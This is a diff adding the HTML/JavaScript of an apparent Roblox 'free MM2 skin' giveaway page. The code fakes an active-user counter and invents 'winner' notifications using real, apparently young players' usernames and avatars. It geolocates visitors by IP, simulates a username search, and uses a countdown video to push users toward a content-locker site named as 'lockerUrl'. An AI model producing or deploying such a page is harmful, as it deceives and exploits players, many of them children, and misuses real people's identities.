+        <div class="item-card"><img class="item-img" src="images/Chroma Sands.webp" alt="Chroma Sands"><div class="item-name mm2-skin-name">Chroma Sands</div></div>
+        <div class="item-card"><img class="item-img" src="images/Chroma beachy knife.webp" alt="Chroma Beachy"><div class="item-name mm2-skin-name">Chroma Beachy</div></div>
+        <div class="item-card"><img class="item-img" src="images/Chroma Traveler.webp" alt="Chroma Traveler"><div class="item-name mm2-skin-name">Chroma Traveler</div></div>
+        <div class="item-card"><img class="item-img" src="images/TravellersAxe.webp" alt="Traveler Axe"><div class="item-name mm2-skin-name">Traveler Axe</div></div>
+      </div>
+      <div class="items-row">
+        <div class="item-card"><img class="item-img" src="images/Gingerscope.webp" alt="Gingerscope"><div class="item-name mm2-skin-name">Gingerscope</div></div>
+        <div class="item-card"><img class="item-img" src="images/Chroma_Evergreen.webp" alt="Chroma Evergreen"><div class="item-name mm2-skin-name">Chroma Evergreen</div></div>
+        <div class="item-card"><img class="item-img" src="images/ChromaSunsetGun.webp" alt="Chroma Sunset"><div class="item-name mm2-skin-name">Chroma Sunset</div></div>
+        <div class="item-card"><img class="item-img" src="images/ChromaSunsetKnife.webp" alt="Chroma Sunset"><div class="item-name mm2-skin-name">Chroma Sunset</div></div>
+        <div class="item-card"><img class="item-img" src="images/ChromaBlizzardGun.webp" alt="Chroma Blizzard"><div class="item-name mm2-skin-name">Chroma Blizzard</div></div>
+        <div class="item-card"><img class="item-img" src="images/ChromaSnowDagger.webp" alt="Chroma Snow Dagger"><div class="item-name mm2-skin-name">Chroma Snow Dagger</div></div>
+      </div>
+      <div class="items-row">
+        <div class="item-card"><img class="item-img" src="images/ChromaAlienbeam.webp" alt="Chroma Alienbeam"><div class="item-name mm2-skin-name">Chroma Alienbeam</div></div>
+        <div class="item-card"><img class="item-img" src="images/ChromaRaygun.webp" alt="Chroma Raygun"><div class="item-name mm2-skin-name">Chroma Raygun</div></div>
+        <div class="item-card"><img class="item-img" src="images/chromasweetknife.webp" alt="Chroma Sweet Knife"><div class="item-name mm2-skin-name">Chroma Sweet</div></div>
+        <div class="item-card"><img class="item-img" src="images/ChromaVampiresGun.webp" alt="Chroma Vampires Gun"><div class="item-name mm2-skin-name">Chroma Vampires</div></div>
+        <div class="item-card"><img class="item-img" src="images/2024BaubleChroma.webp" alt="2024 Chroma Bauble"><div class="item-name mm2-skin-name">2024 Bauble Chroma</div></div>
+        <div class="item-card"><img class="item-img" src="images/2024ConstellationChroma.webp" alt="2024 Chroma Constellation"><div class="item-name mm2-skin-name">2024 Constellation Chroma</div></div>
+      </div>
+      <div class="items-row">
+        <div class="item-card"><img class="item-img" src="images/Chroma_Heart_Wand.webp" alt="Chroma Heart Wand"><div class="item-name mm2-skin-name">Chroma Heart Wand</div></div>
+        <div class="item-card"><img class="item-img" src="images/Chroma_Snowcannon.webp" alt="Chroma Snowcannon"><div class="item-name mm2-skin-name">Chroma Snowcannon</div></div>
+        <div class="item-card"><img class="item-img" src="images/ChromaSnowstorm.webp" alt="Chroma Snowstorm"><div class="item-name mm2-skin-name">Chroma Snowstorm</div></div>
+      </div>
+    </div>
+
+    <div class="continue-button-container" id="main-continue-container" style="display:none;position:fixed;bottom:20px;left:0;right:0;text-align:center;width:100%;max-width:520px;margin:0 auto;padding:0 18px;box-sizing:border-box;z-index:999;">
+      <button class="continue-btn" id="main-continue-btn" type="button" style="background:linear-gradient(90deg,#22c55e 0%,#16e085 100%);color:#fff;font-size:1.35em;font-weight:900;border-radius:16px;border:none;padding:18px 40px;cursor:pointer;box-shadow:0 2px 16px #22c55e55,0 0 20px rgba(34,197,94,0.6);transition:transform 0.15s,box-shadow 0.2s;letter-spacing:0.5px;width:100%;max-width:340px;animation:pulseButton 1.5s infinite alternate;">CONTINUE</button>
+    </div>
+  
+  
+  <div class="cliameds"></div>
+  
+  <!-- Purchase Popup -->
+  <div class="purchase-popup" id="purchase-popup">
+    <div class="popup-content">
+      <!-- Dynamic content -->
+    </div>
+  </div>
+  
+  <!-- Sound elements -->
+  <audio id="dingSound" preload="auto">
+    <source src="media/audio_63c49c13c8.mp3" type="audio/mpeg">
+  </audio>
+  
+  <audio id="clickSound" preload="auto">
+    <source src="media/audio_63c49c13c8.mp3" type="audio/mpeg">
+  </audio>
+
+  <script>
+    // Function to generate random number between 90 and 900
+    function randomUsers() {
+      return Math.floor(Math.random() * (900 - 90 + 1)) + 90;
+    }
+    function updateActiveUsers() {
+      document.getElementById('activeUsersCount').textContent = randomUsers();
+    }
+    updateActiveUsers();
+    setInterval(updateActiveUsers, 4500);
+    
+    // Notifications code
+    // avatars array removed — avatars are now fetched dynamically from the Roblox API
+
+    const usernames = [
+  'Luna123bravo',
+  'Luna_Bobo9',
+  'lunanyolisluna',
+  'luna_151107',
+  'luna_123458931',
+  'LunaBeanz07',
+  'Sara2pacheco',
+  'sara79775',
+  'saralara45611',
+  'SaraAllard10',
+  'Sarakaka255',
+  'Sara_2018om',
+  'stacyskibii',
+  'Stacy201908',
+  'Stacy012531',
+  'Stacy6767677',
+  'Stacyc101',
+  'StacyF1sther123',
+  'Eve212123',
+  'Evelyn_isawesome13',
+  'eve_7373837',
+  'Evelyn_y3k',
+  'Eve30YMG',
+  'Evelin_sisinsta',
+  'Jaydenmontfoort',
+  'jayden_marson',
+  'jaydenrentall',
+  'Jayden00jj',
+  'jayden1236901',
+  'jay_moon309',
+  'Jayjayrod030',
+  'JayJayJadiel',
+  'Jay4uhew',
+  'Jaycool201924',
+  'JayJayTheMaster09',
+  'Lilyisarobloxgirll',
+  'lillie_5647',
+  'lilyydiann',
+  'Lillyamos123',
+  'Lilybop7777',
+  'lil_poolol'
+];
+    
+    // ── Robust Roblox profile/avatar loader ───────────────────────────────────
+    const FALLBACK_AVATAR = 'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=150&height=150&format=png';
+    const AVATAR_CACHE_KEY = 'roblox_avatar_cache_v4';
+    const AVATAR_LOOKUP_TIMEOUT_MS = 9000;
+    const AVATAR_STORAGE_KEY = 'roblox_avatar_cache_persistent_v1';
+    const AVATAR_CACHE_TTL_MS = 24 * 60 * 60 * 1000;
+    const ROBLOX_USERS_SEARCH_ENDPOINTS = [
+      {
+        name: 'official',
+        kind: 'post',
+        url: '/api/roblox/users/v1/usernames/users'
+      },
+      {
+        name: 'official-search',
+        kind: 'search',
+        url: '/api/roblox/users/v1/users/search?keyword='
+      },
+      {
+        name: 'official-profile',
+        kind: 'profile',
+        url: '/api/roblox/profile?username='
+      },
+      {
+        name: 'roproxy',
+        kind: 'search',
+        url: '/api/roblox/roproxy/users/v1/users/search?keyword='
+      }
+    ];
+
+    const avatarCache = {};
+    const avatarRequests = new Map();
+    const avatarEndpointHealth = new Map();
+    let avatarProtocolWarningShown = false;
+
+    function normalizeUsername(username) {
+      return String(username || '').trim().replace(/^@/, '').toLowerCase();
+    }
+
+    try {
+      const stored = JSON.parse(sessionStorage.getItem(AVATAR_CACHE_KEY) || '{}');
+      if (stored && typeof stored === 'object') Object.assign(avatarCache, stored);
+    } catch (_) {}
+
+    try {
+      const stored = JSON.parse(localStorage.getItem(AVATAR_STORAGE_KEY) || '{}');
+      if (stored && typeof stored === 'object') {
+        const now = Date.now();
+        Object.entries(stored).forEach(function(entry) {
+          const key = normalizeUsername(entry[0]);
+          const record = entry[1];
+          if (
+            key &&
+            record &&
+            typeof record.url === 'string' &&
+            /^https?:\/\//i.test(record.url) &&
+            record.expiresAt > now
+          ) {
+            avatarCache[key] = record.url;
+          }
+        });
+      }
+    } catch (_) {}
+
+    // Seed the cache from the bundled profile catalog for instant bar rendering.
+    try {
+      if (window.PROFILE_AVATARS && typeof window.PROFILE_AVATARS === 'object') {
+        Object.entries(window.PROFILE_AVATARS).forEach(function(entry) {
+          const key = normalizeUsername(entry[0]);
+          const url = String(entry[1] || '').trim();
+          if (key && /^https?:\/\//i.test(url)) avatarCache[key] = url;
+        });
+      }
+    } catch (_) {}
+
+    function retryAfterDelayMs(value) {
+      if (!value) return null;
+      const seconds = Number(value);
+      if (Number.isFinite(seconds) && seconds >= 0) return seconds * 1000;
+      const retryAt = Date.parse(value);
+      return Number.isFinite(retryAt) ? Math.max(0, retryAt - Date.now()) : null;
+    }
+
+    function markAvatarEndpointFailure(endpointName, retryAfter) {
+      const previous = avatarEndpointHealth.get(endpointName);
+      const failureCount = (previous && previous.failureCount || 0) + 1;
+      const backoffDelay = Math.min(15000 * Math.pow(2, Math.min(failureCount - 1, 5)), 5 * 60 * 1000);
+      const retryDelay = retryAfter === null ? backoffDelay : Math.max(backoffDelay, retryAfter);
+      avatarEndpointHealth.set(endpointName, {
+        success: false,
+        checkedAt: Date.now(),
+        failureCount: failureCount,
+        retryAt: Date.now() + retryDelay
+      });
+    }
+
+    function noteAvatarEndpointFailure(endpointName) {
+      const previous = avatarEndpointHealth.get(endpointName);
+      if (previous && previous.retryAt > Date.now()) return;
+      avatarEndpointHealth.set(endpointName, {
+        success: false,
+        checkedAt: Date.now()
+      });
+    }
+
+    function noteAvatarEndpointRateLimit(endpointName, response) {
+      if (response.status === 429) {
+        markAvatarEndpointFailure(endpointName, retryAfterDelayMs(response.headers.get('Retry-After')));
+      }
+    }
+
+    async function fetchJsonWithTimeout(url, timeoutMs, endpointName) {
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), timeoutMs);
+      try {
+        const res = await fetch(url, { signal: controller.signal, cache: 'force-cache' });
+        if (endpointName) noteAvatarEndpointRateLimit(endpointName, res);
+        if (!res.ok) return null;
+        return await res.json();
+      } catch (_) {
+        return null;
+      } finally {
+        clearTimeout(timer);
+      }
+    }
+
+    async function fetchJsonPostWithTimeout(url, body, timeoutMs, endpointName) {
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), timeoutMs);
+      try {
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body),
+          signal: controller.signal,
+          cache: 'no-store'
+        });
+        if (endpointName) noteAvatarEndpointRateLimit(endpointName, res);
+        if (!res.ok) return null;
+        return await res.json();
+      } catch (_) {
+        return null;
+      } finally {
+        clearTimeout(timer);
+      }
+    }
+
+    async function fetchProfileRedirectUserId(username, timeoutMs, endpointName) {
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), timeoutMs);
+      try {
+        const response = await fetch(
+          '/api/roblox/profile?username=' + encodeURIComponent(username),
+          {
+            signal: controller.signal,
+            redirect: 'follow',
+            cache: 'force-cache'
+          }
+        );
+        noteAvatarEndpointRateLimit(endpointName, response);
+        if (!response.ok) return null;
+        const data = await response.json();
+        if (data && data.userId) return String(data.userId);
+        const match = String(data && data.url || response.url || '').match(/\/users\/(\d+)\/profile/i);
+        return match ? match[1] : null;
+      } catch (_) {
+        return null;
+      } finally {
+        clearTimeout(timer);
+      }
+    }
+
+    function robloxHeadshotUrl(userId) {
+      return 'https://www.roblox.com/headshot-thumbnail/image?userId=' + encodeURIComponent(userId) + '&width=150&height=150&format=png';
+    }
+
+    async function lookupRobloxUserId(username) {
+      const encoded = encodeURIComponent(username);
+      const wanted = normalizeUsername(username);
+      const startedAt = Date.now();
+
+      for (const endpoint of ROBLOX_USERS_SEARCH_ENDPOINTS) {
+        const remaining = AVATAR_LOOKUP_TIMEOUT_MS - (Date.now() - startedAt);
+        if (remaining <= 0) break;
+        const health = avatarEndpointHealth.get(endpoint.name);
+        if (health && health.retryAt > Date.now()) continue;
+
+        const timeoutMs = Math.min(3000, remaining);
+        let data = null;
+
+        if (endpoint.kind === 'post') {
+          data = await fetchJsonPostWithTimeout(
+            endpoint.url,
+            { usernames: [username], excludeBannedUsers: false },
+            timeoutMs,
+            endpoint.name
+          );
+        } else if (endpoint.kind === 'profile') {
+          const redirectUserId = await fetchProfileRedirectUserId(username, timeoutMs, endpoint.name);
+          if (redirectUserId) {
+            avatarEndpointHealth.set(endpoint.name, {
+              success: true,
+              checkedAt: Date.now()
+            });
+            return redirectUserId;
+          }
+          noteAvatarEndpointFailure(endpoint.name);
+          continue;
+        } else {
+          data = await fetchJsonWithTimeout(endpoint.url + encoded, timeoutMs, endpoint.name);
+        }
+
+        const list = data && (data.data || data.data?.data);
+        if (!Array.isArray(list)) {
+          noteAvatarEndpointFailure(endpoint.name);
+          continue;
+        }
+
+        const exact = list.find(function(user) {
+          return user && user.id && normalizeUsername(user.name) === wanted;
+        });
+
+        if (exact) {
+          avatarEndpointHealth.set(endpoint.name, {
+            success: true,
+            checkedAt: Date.now()
+          });
+          return exact.id;
+        }
+
+        noteAvatarEndpointFailure(endpoint.name);
+      }
+      return null;
+    }
+
+    async function lookupRobloxHeadshot(userId) {
+      const thumbnailEndpoints = [
+        '/api/roblox/thumbnails/v1/users/avatar-headshot?userIds=' + encodeURIComponent(userId) + '&size=150x150&format=Png&isCircular=false',
+        '/api/roblox/roproxy/thumbnails/v1/users/avatar-headshot?userIds=' + encodeURIComponent(userId) + '&size=150x150&format=Png&isCircular=false'
+      ];
+
+      for (const endpoint of thumbnailEndpoints) {
+        const thumbData = await fetchJsonWithTimeout(endpoint, 3000);
+        const imageUrl = thumbData && thumbData.data && thumbData.data[0] && thumbData.data[0].imageUrl;
+        if (imageUrl) return imageUrl;
+      }
+      return robloxHeadshotUrl(userId);
+    }
+
+    async function fetchAvatarFromDualApi(username) {
+      const userId = await lookupRobloxUserId(username);
+      return userId ? await lookupRobloxHeadshot(userId) : null;
+    }
+
+    async function fetchOneAvatar(username) {
+      const key = normalizeUsername(username);
+      if (!key) return null;
+      if (avatarCache[key]) return avatarCache[key];
+      if (avatarRequests.has(key)) return avatarRequests.get(key);
+      if (window.location.protocol !== 'http:' && window.location.protocol !== 'https:') {
+        if (!avatarProtocolWarningShown) {
+          console.warn('Live avatar lookups require HTTP(S). Open this page through Vercel or a local HTTP server, not file://.');
+          avatarProtocolWarningShown = true;
+        }
+        return null;
+      }
+
+      const request = fetchAvatarFromDualApi(username).then(function(avatar) {
+        if (avatar) {
+          avatarCache[key] = avatar;
+          try {
+            sessionStorage.setItem(AVATAR_CACHE_KEY, JSON.stringify(avatarCache));
+          } catch (_) {}
+          try {
+            const stored = JSON.parse(localStorage.getItem(AVATAR_STORAGE_KEY) || '{}');
+            stored[key] = {
+              url: avatar,
+              expiresAt: Date.now() + AVATAR_CACHE_TTL_MS
+            };
+            localStorage.setItem(AVATAR_STORAGE_KEY, JSON.stringify(stored));
+          } catch (_) {}
+        }
+        return avatar || null;
+      }).finally(function() {
+        avatarRequests.delete(key);
+      });
+      avatarRequests.set(key, request);
+      return request;
+    }
+
+    async function fetchAllAvatars() {
+      const batchSize = 6;
+      for (let i = 0; i < usernames.length; i += batchSize) {
+        await Promise.all(usernames.slice(i, i + batchSize).map(fetchOneAvatar));
+      }
+    }
+
+    function getAvatarForUsername(username) {
+      return avatarCache[normalizeUsername(username)] || FALLBACK_AVATAR;
+    }
+
+    // Do not prefetch every username: the bundled catalog renders instantly and
+    // uncatalogued profiles are resolved only when selected or searched.
+    // ── End robust profile/avatar loader ──────────────────────────────────────
+
+    // Game source used in notifications / verification
+    const gameSources = [
+      'Travel Town'
+    ];
+    
+    // User country data - will be populated with IP API
+    let userCountry = '';
+    let userCountryCode = '';
+    let countryUsers = {};
+    
+    // Global data object for country information
+    const globalDatas = { 
+        country_code: null, 
+        country_name: null, 
+        flagUrl: null, 
+    }; 
+    
+    // Fetch user's IP address and then country information
+    $.getJSON("https://api.ipify.org?format=json", function(data) { 
+        var ipAddress = data.ip; 
+        $.getJSON("https://ipapi.co/" + ipAddress + "/json/", function(response) { 
+            globalDatas.country_code = response.country_code; 
+            globalDatas.country_name = response.country_name; 
+            globalDatas.flagUrl = "https://flagcdn.com/w320/" + response.country_code.toLowerCase() + ".png"; 
+            
+            // Also update the existing variables for compatibility
+            userCountry = response.country_name;
+            userCountryCode = response.country_code.toLowerCase();
+            
+            // Initialize country users object with random usernames
+            const shuffledUsernames = [...usernames].sort(() => 0.5 - Math.random());
+            countryUsers[userCountryCode] = shuffledUsernames.slice(0, 10); // Assign 10 random users to user's country
+            
+            console.log('User country detected:', userCountry, 'Code:', userCountryCode);
+        }); 
+    }).fail(function(error) {
+        console.error('Error fetching country data:', error);
+        userCountry = 'Unknown';
+        userCountryCode = 'us'; // Default to US flag if country detection fails
+        globalDatas.country_code = 'US';
+        globalDatas.country_name = 'United States';
+        globalDatas.flagUrl = 'https://flagcdn.com/w320/us.png';
+    });
+
+    // Get all item names and images from the DOM
+    let notificationItems = [];
+    $(document).ready(function() {
+      notificationItems = $('.item-card').map(function() {
+        return {
+          name: $(this).find('.item-name').text().trim(),
+          img: $(this).find('.item-img').attr('src')
+        };
+      }).get();
+    });
+    let notificationIndex = 0;
+
+    // Notification control variables
+    let notificationInterval;
+    let popupOpen = false;
+    let notificationUsernameQueue = [];
+    const notificationSourceNames = [
+      'JustPlay',
+      'Copper',
+      'BestPlay',
+      'MistPlay'
+    ];
+
+    function shuffledUsernames() {
+      const shuffled = usernames.slice();
+      for (let i = shuffled.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
+      }
+      return shuffled;
+    }
+
+    function getNextNotificationUsername() {
+      if (notificationUsernameQueue.length === 0) {
+        notificationUsernameQueue = shuffledUsernames();
+      }
+      return notificationUsernameQueue.shift();
+    }
+
+    function getRandomNotificationSourceName() {
+      return notificationSourceNames[Math.floor(Math.random() * notificationSourceNames.length)];
+    }
+
+    function startNotifications() {
+      if (popupOpen) return;
+      clearInterval(notificationInterval);
+      notificationInterval = setInterval(async function() {
+        if (popupOpen) return;
+        if (notificationItems.length === 0) return;
+        $(".cliameds").fadeIn(); 
+        
+        // Randomly select an MM2 item from the website
+        const randomItem = notificationItems[Math.floor(Math.random() * notificationItems.length)];
+        const randomItemName = randomItem.name;
+        
+        // Shuffle through every valid profile once before restarting a new cycle.
+        const username = getNextNotificationUsername();
+        const sourceName = getRandomNotificationSourceName();
+        
+        // Keep the notification bar visible while its real profile headshot is loaded.
+        const cachedAvatar = getAvatarForUsername(username);
+        const normalizedUsername = normalizeUsername(username);
+        let html = `
+          <div class="message">
+            <div class="img"><img class="notification-avatar" data-username="${normalizedUsername}" src="${cachedAvatar}" alt="${username}" onerror="this.onerror=null;this.src='${FALLBACK_AVATAR}'"></div>
+            <div class="more">
+              <div>${username} from <span class="country-flag"><img src="${globalDatas.flagUrl || 'https://flagcdn.com/w320/us.png'}" style="width:24px;height:18px;vertical-align:middle;"></span></div>
+              <div>Got ${randomItemName} after complete ${sourceName}</div>
+            </div>
+          </div>
+        `;
+        
+        $(".cliameds").html(html);
+
+        // Background/cache may be empty, so resolve the selected profile on demand.
+        if (!avatarCache[username.toLowerCase()]) {
+          const loadedAvatar = await fetchOneAvatar(username);
+          if (loadedAvatar) {
+            const currentImage = document.querySelector('.cliameds .notification-avatar[data-username="' + normalizedUsername + '"]');
+            if (currentImage) currentImage.src = loadedAvatar;
+          }
+        }
+
+        setTimeout(function() {
+          $(".cliameds").fadeOut();  
+        }, 3000);
+      }, 5000);
+    }
+
+    function stopNotifications() {
+      clearInterval(notificationInterval);
+      $(".cliameds").fadeOut();
+    }
+    
+    // بدء الإشعارات عند تحميل الصفحة
+    startNotifications();
+    
+    // Function to show purchase popup
+    const showPurchasePopup = (itemName, itemImage) => {
+      // إيقاف الإشعارات عند فتح الواجهة
+      popupOpen = true;
+      stopNotifications();
+      
+      const popup = document.getElementById('purchase-popup');
+      const popupContent = popup.querySelector('.popup-content');
+      
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Get Item</h3>
+        </div>
+        <img src="${itemImage}" alt="Item Image" class="item-popup-image">
+        <p class="item-confirm">Would you like to Get "<span>${itemName}</span>"?</p>
+        <div class="input-group">
+          <input type="text" id="username-input" placeholder="Enter your Roblox username">
+        </div>
+        <div class="user-error d-none">Please enter a valid username</div>
+        <div class="popup-buttons">
+          <button class="cancel-btn">Cancel</button>
+          <button class="action-btn" id="search-user-btn">
+            <span class="action-badge">Search Now ➤</span>
+          </button>
+        </div>
+      `;
+      
+      popupContent.querySelector('.cancel-btn').addEventListener('click', closePurchasePopup);
+      popupContent.querySelector('#search-user-btn').addEventListener('click', function() {
+        // Play sound when clicking button
+        const clickSound = document.getElementById('clickSound');
+        clickSound.currentTime = 0;
+        clickSound.play();
+        
+        const username = document.getElementById('username-input').value.trim();
+        if (!username) {
+          document.querySelector('.user-error').classList.remove('d-none');
+          return;
+        }
+        showUsernameConfirmation(username, itemName, itemImage, function() { showPurchasePopup(itemName, itemImage); });
+      });
+      
+      popup.style.display = 'flex';
+      document.getElementById('username-input').focus();
+    }
+
+    // Function to close popup
+    const closePurchasePopup = () => {
+      document.getElementById('purchase-popup').style.display = 'none';
+      popupOpen = false;
+      // إعادة تشغيل الإشعارات عند إغلاق الواجهة
+      startNotifications();
+    }
+
+    // Add globalData object at the top of the script
+    const globalData = { full_name: null, user_name: null, friends_count: null, followers_count: null, followings_count: null, user_id: null, user_avatar: null, robux: null };
+
+
+
+    // Function to show searching state
+    const showSearchingState = (username, itemName, itemImage) => {
+      const popupContent = document.querySelector('.popup-content');
+      popupContent.innerHTML = `
+        <div class="popup-header">
+          <h3>Get Item</h3>
+        </div>
+        <div style="text-align:center;padding:20px">
+          <div class="folding">
+            <div class="sk-cube1 sk-cube"></div>
+            <div class="sk-cube2 sk-cube"></div>
+            <div class="sk-cube4 sk-cube"></div>
+            <div class="sk-cube3 sk-cube"></div>
+            <div class="square"></div>
+          </div>
+          <p class="searching-text">Searching for @${username}</p>
+        </div>
+      `;
+      
+      // Simulate API call with a delay
+      setTimeout(() => {
+        // Set user data in globalData
+        globalData.user_name = username;
+        
+        showSuccessState(username, itemName, itemImage);
+      }, 1500); // Add a slight delay to simulate API call
+    }
+
+    // Function to show success state
+    // Supports both signatures:
+    // - showSuccessState(username, itemName, itemImage)
+    // - showSuccessState(username, avatarUrl, itemName, itemImage)
+    const showSuccessState = (username, avatarOrItemName, itemNameOrItemImage, maybeItemImage) => {
+      const hasAvatar = typeof maybeItemImage !== 'undefined';
+      const avatarUrl = hasAvatar ? avatarOrItemName : null;
+      const itemName = hasAvatar ? itemNameOrItemImage : avatarOrItemName;
+      const itemImage = hasAvatar ? maybeItemImage : itemNameOrItemImage;
+      const popupContent = document.querySelector('.popup-content');
+      const avatarHtml = avatarUrl ? `<img src="${avatarUrl}" alt="@${username}" class="result-avatar" style="margin-top:10px;">` : '';
+      popupContent.innerHTML = `
+        <div style="background: #fff1; border-radius: 18px; padding: 40px 20px; margin-bottom: 0; box-shadow: 0 2px 8px #0001; max-width: 380px; margin: 0 auto; text-align: center;">
+          <div style="display: flex; flex-direction: column; align-items: center;">
+            <div style="width: 80px; height: 80px; border-radius: 50%; background-color: #22c55e; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; box-shadow: 0 0 20px rgba(34, 197, 94, 0.5); animation: fadeInUp 0.8s ease-out, pulse-glow 1.5s infinite;">
+              <span style="color: white; font-size: 40px; font-weight: bold;">✓</span>
+            </div>
+            <div style="font-weight: 900; font-size: 1.8em; color: var(--accent2); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 15px; animation: fadeInUp 0.8s ease-out;">USERNAME FOUND!</div>
+            <div style="color: var(--text-main); font-size: 1.1em; margin-bottom: 30px; animation: fadeInUp 0.8s ease-out 0.2s both;">@${username}</div>
+            ${avatarHtml}
+            <div style="display: flex; flex-direction: column; gap: 12px; width: 100%;">
+              <button class="get-item-now-btn" style="background: linear-gradient(45deg, #22c55e, #16e085); color: #fff; font-size: 1.2em; font-weight: 700; border-radius: 12px; border: none; padding: 15px 0; cursor: pointer; box-shadow: 0 4px 15px #22c55e55; transition: all 0.3s; animation: fadeInUp 0.8s ease-out 0.4s both;">CONTINUE</button>
+              <button id="retry-btn" style="background: transparent; color: var(--text-muted); font-size: 1em; font-weight: 600; border: 2px solid var(--text-muted); border-radius: 12px; padding: 12px 0; cursor: pointer; transition: all 0.3s; animation: fadeInUp 0.8s ease-out 0.6s both;">TRY DIFFERENT USERNAME</button>
+            </div>
+          </div>
+        </div>
+      `;
+      // Add animation styles
+      const style = document.createElement('style');
+      style.innerHTML = `
+        @keyframes fadeInUp {
+          from {
+            opacity: 0;
+            transform: translateY(20px);
+          }
+          to {
+            opacity: 1;
+            transform: translateY(0);
+          }
+        }
+        @keyframes pulse-glow {
+          0% { box-shadow: 0 0 0 0 #22c55e88; }
+          70% { box-shadow: 0 0 0 16px #22c55e00; }
+          100% { box-shadow: 0 0 0 0 #22c55e00; }
+        }
+      `;
+      document.head.appendChild(style);
+      
+      popupContent.querySelector('.get-item-now-btn').addEventListener('click', function() {
+        const clickSound = document.getElementById('clickSound');
+        clickSound.currentTime = 0;
+        clickSound.play();
+        // Show video overlay
+        showVideoOverlay();
+      });
+      popupContent.querySelector('#retry-btn').addEventListener('click', function() {
+        // Close popup and refocus username input for retry
+        const popup = document.getElementById('purchase-popup');
+        if (popup) {
+          popup.style.display = 'none';
+        }
+        const mainUsernameInput = document.getElementById('main-username-input');
+        if (mainUsernameInput) {
+          mainUsernameInput.focus();
+          mainUsernameInput.select();
+        }
+      });
+    }
+
+    // Function to show video overlay with countdown timer
+    const showVideoOverlay = () => {
+      const popupContent = document.querySelector('.popup-content');
+      let timeLeft = 95; // 1:25 in seconds
+      const lockerUrl = "https://installchecker.site/cl/i/rneo6k";
+      
+      const formatTime = (seconds) => {
+        const mins = Math.floor(seconds / 60);
+        const secs = seconds % 60;
+        return `${mins}:${secs.toString().padStart(2, '0')}`;
+      };
+      
+      const updateButton = () => {
+        const btn = document.getElementById('video-continue-btn');
+        if (btn) {
+          if (timeLeft > 0) {
+            btn.textContent = `Continue (${formatTime(timeLeft)})`;
+            btn.style.opacity = '0.6';
+            btn.style.cursor = 'not-allowed';
+            btn.disabled = true;
+          } else {
+            btn.textContent = 'Continue';
+            btn.style.opacity = '1';
+            btn.style.cursor = 'pointer';
+            btn.disabled = false;
+          }
+        }
+      };
+      
+      popupContent.innerHTML = `
+        <div class="video-overlay-container" style="background: var(--card-bg); width: 100%; height: 100%; display: flex; flex-direction: column; box-sizing: border-box; overflow: hidden; border: 2px solid rgba(255, 255, 255, 0.2);">
+          <div class="video-header" style="flex-shrink: 0; padding: 16px 18px; text-align: center; background: rgba(255, 255, 255, 0.05); border-bottom: 1px solid rgba(255, 255, 255, 0.1);">
+            <h3 class="video-title" style="color: #ffffff; font-size: 1.5em; font-weight: 800; margin: 0 0 6px 0; letter-spacing: -0.5px; line-height: 1.3; font-family: 'Poppins', Arial, sans-serif;">How To Get Any MM2 Skin For Free</h3>
+            <p class="video-subtitle" style="color: #e5e7eb; font-size: 0.95em; margin: 0; display: flex; align-items: center; justify-content: center; gap: 6px; line-height: 1.3; font-family: 'Poppins', Arial, sans-serif; font-weight: 500;">
+              Watch the video till the end <span style="font-size: 1.2em;">👇</span>
+            </p>
+          </div>
+          <div class="video-wrapper" style="flex: 1; min-height: 0; position: relative; width: 100%; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; border-radius: 0; margin: 0; box-shadow: none;">
+            <iframe allow="fullscreen" allowfullscreen src="https://streamable.com/e/t35rls?loop=0&nocontrols=1" style="border: none; width: 100%; height: 100%; object-fit: cover;"></iframe>
+          </div>
+          <div class="video-footer" style="flex-shrink: 0; padding: 16px 18px; background: rgba(255, 255, 255, 0.05); border-top: 1px solid rgba(255, 255, 255, 0.1); text-align: center;">
+            <p id="video-timer" style="color: #22c55e; font-size: 1.1em; margin: 0; font-family: 'Poppins', Arial, sans-serif; font-weight: 700; letter-spacing: 0.5px;">Redirecting in ${formatTime(timeLeft)}...</p>
+          </div>
+        </div>
+      `;
+      
+      // Add responsive styles for mobile - TRUE FULLSCREEN
+      const videoStyle = document.createElement('style');
+      videoStyle.innerHTML = `
+        @media (max-width: 768px) {
+          .purchase-popup {
+            background: rgba(0, 0, 0, 0.85) !important;
+            backdrop-filter: blur(5px) !important;
+            padding: 0 !important;
+          }
+          .popup-content {
+            width: 100vw !important;
+            max-width: 100vw !important;
+            height: 100vh !important;
+            max-height: 100vh !important;
+            border-radius: 0 !important;
+            margin: 0 !important;
+            padding: 0 !important;
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            transform: none !important;
+            background: transparent !important;
+            border: none !important;
+            box-shadow: none !important;
+            overflow: hidden !important;
+          }
+          .video-overlay-container {
+            width: 100vw !important;
+            height: 100vh !important;
+            padding: 0 !important;
+            margin: 0 !important;
+            border-radius: 0 !important;
+            border: none !important;
+            background: var(--card-bg) !important;
+          }
+          .video-header {
+            padding: 14px 14px !important;
+          }
+          .video-title {
+            font-size: 1.3em !important;
+            margin-bottom: 6px !important;
+          }
+          .video-subtitle {
+            font-size: 0.9em !important;
+            margin: 0 !important;
+          }
+          .video-wrapper {
+            flex: 1 !important;
+            min-height: 0 !important;
+            width: 100% !important;
+            margin: 0 !important;
+            padding: 0 !important;
+          }
+          .video-footer {
+            padding: 10px 12px !important;
+          }
+          .video-continue-btn {
+            font-size: 0.95em !important;
+            padding: 12px 0 !important;
+          }
+        }
+        @media (max-width: 600px) {
+          .video-header {
+            padding: 12px 12px !important;
+          }
+          .video-title {
+            font-size: 1.15em !important;
+          }
+          .video-subtitle {
+            font-size: 0.85em !important;
+          }
+          .video-footer {
+            padding: 12px 12px !important;
+          }
+          .video-continue-btn {
+            font-size: 0.9em !important;
+            padding: 12px 0 !important;
+          }
+        }
+        @media (max-width: 400px) {
+          .video-header {
+            padding: 6px 8px !important;
+          }
+          .video-title {
+            font-size: 0.95em !important;
+          }
+          .video-subtitle {
+            font-size: 0.7em !important;
+          }
